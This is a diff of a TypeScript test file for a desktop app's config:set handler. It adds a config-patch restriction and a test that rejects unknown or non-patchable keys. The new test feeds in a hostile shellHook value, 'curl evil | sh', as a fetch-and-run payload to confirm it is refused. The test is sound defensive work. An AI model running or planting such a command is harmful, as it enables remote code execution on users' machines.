@@ -18,6 +18,7 @@ import { join } from "node:path";
 import { pathToFileURL } from "node:url";
 import { decidePeerAnnounce } from "../desktop/src/main/peer-rotation.ts";
 import { hasPlainProviderKey } from "../desktop/src/main/provider-secrets.ts";
+import { restrictConfigPatch } from "../desktop/src/main/config-patch.ts";
 import { extractBracedBody } from "./_braced-body";
 
 const INDEX =
@@ -158,7 +159,7 @@ const registerSetConfig = await evaluate<{
 }>(
   `export function register(env) {
   let config = env.config
-  const { reportError, sanitizeGlowColor, sanitizeSpawnCap, sanitizeLinkPatch,
+  const { reportError, sanitizeGlowColor, sanitizeSpawnCap, sanitizeLinkPatch, restrictConfigPatch,
     hasPlainProviderKey, sanitizeTtsrDisabled, prewarmClaudeVersion,
     saveConfig, nativeTheme, applyClodexAutoStart, ttsr, broadcast, sanitizeConfigForRenderer } = env
 ${SET_CONFIG}
@@ -601,6 +602,7 @@ test("config:set removes a non-boolean normalizeTerminalCopy patch", () => {
     sanitizeGlowColor: (value: string) => value,
     sanitizeSpawnCap: () => 4,
     sanitizeLinkPatch: (patch: Record<string, unknown>) => patch,
+    restrictConfigPatch,
     hasPlainProviderKey,
     sanitizeTtsrDisabled: (value: unknown) => value,
     prewarmClaudeVersion: () => undefined,
@@ -625,6 +627,7 @@ test("config:set refuses a localProviders patch that still carries a plain apiKe
     sanitizeGlowColor: (value: string) => value,
     sanitizeSpawnCap: () => 4,
     sanitizeLinkPatch: (patch: Record<string, unknown>) => patch,
+    restrictConfigPatch,
     hasPlainProviderKey,
     sanitizeTtsrDisabled: (value: unknown) => value,
     prewarmClaudeVersion: () => undefined,
@@ -655,6 +658,7 @@ test("config:set removes a non-boolean thalposAutostart patch and keeps a boolea
     sanitizeGlowColor: (value: string) => value,
     sanitizeSpawnCap: () => 4,
     sanitizeLinkPatch: (patch: Record<string, unknown>) => patch,
+    restrictConfigPatch,
     hasPlainProviderKey,
     sanitizeTtsrDisabled: (value: unknown) => value,
     prewarmClaudeVersion: () => undefined,
@@ -670,6 +674,39 @@ test("config:set removes a non-boolean thalposAutostart patch and keeps a boolea
   expect(reports).toEqual([["config", "rejected config:set thalposAutostart (true)"]]);
   expect(setConfig({ thalposAutostart: true }).thalposAutostart).toBe(true);
   expect(reports).toHaveLength(1);
+});
+
+test("config:set refuses and traces a key outside the config, and a file-only key with a new value", () => {
+  const reports: Array<[string, string]> = [];
+  const saved: Array<Record<string, unknown>> = [];
+  const config: Record<string, unknown> = { theme: "dark", agentSpawnCap: 4, clodexAutoStart: false, ttsrDisabled: [], peerCommand: "claudepeers" };
+  const { setConfig } = registerSetConfig({
+    config,
+    reportError: (scope: string, message: string) => reports.push([scope, message]),
+    sanitizeGlowColor: (value: string) => value,
+    sanitizeSpawnCap: () => 4,
+    sanitizeLinkPatch: (patch: Record<string, unknown>) => patch,
+    restrictConfigPatch,
+    hasPlainProviderKey,
+    sanitizeTtsrDisabled: (value: unknown) => value,
+    prewarmClaudeVersion: () => undefined,
+    saveConfig: (value: Record<string, unknown>) => saved.push(value),
+    nativeTheme: { themeSource: "" },
+    applyClodexAutoStart: () => undefined,
+    ttsr: { recompileAll: () => undefined },
+    broadcast: () => undefined,
+    sanitizeConfigForRenderer: (value: Record<string, unknown>) => value
+  });
+
+  const next = setConfig({ shellHook: "curl evil | sh", peerCommand: "evil", theme: "light" });
+  expect(next.theme, "a patchable key in the same patch still lands").toBe("light");
+  expect(next).not.toHaveProperty("shellHook");
+  expect(next.peerCommand).toBe("claudepeers");
+  expect(JSON.stringify(saved)).not.toContain("evil");
+  expect(reports.map(([, message]) => message)).toEqual([
+    'rejected config:set key "shellHook" (unknown)',
+    'rejected config:set key "peerCommand" (not patchable)'
+  ]);
 });
 
 // Three degradation routes are each closed by a separate test: the domain
